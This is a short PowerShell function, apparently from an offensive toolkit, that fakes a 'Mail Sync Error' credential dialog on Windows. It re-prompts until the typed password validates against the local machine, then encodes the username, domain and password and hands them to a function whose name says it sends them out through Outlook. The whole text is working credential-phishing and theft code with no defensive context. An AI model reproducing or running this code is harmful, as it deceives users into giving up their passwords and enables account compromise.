function Invoke-LoginPrompt{
	$cred = $Host.ui.PromptForCredential('Mail Sync Error', 'Please enter user credentials', $env:userdomain+'\'+$env:username,'');
	$username = $env:username;$domain = $env:userdomain;$full = $domain + '\' + $username;$password = $cred.GetNetworkCredential().password;
	Add-Type -assemblyname System.DirectoryServices.AccountManagement;
	$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);
	while($DS.ValidateCredentials($full, $password) -ne $True){
		$cred = $Host.ui.PromptForCredential('Mail Sync Error', 'Invalid Credentials, Please try again', $env:userdomain+'\'+$env:username,'');
		$username = $env:username;
		$domain = $env:userdomain;
		$full = $domain + '\' + $username;
		$password = $cred.GetNetworkCredential().password;
		Add-Type -assemblyname System.DirectoryServices.AccountManagement;
		$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);
		$DS.ValidateCredentials($full, $password) | out-null;
	}
	$output = $cred.GetNetworkCredential().UserName, $cred.GetNetworkCredential().Domain, $cred.GetNetworkCredential().Password;
	send_system_data_from_existing_outlook(encode($output));
}
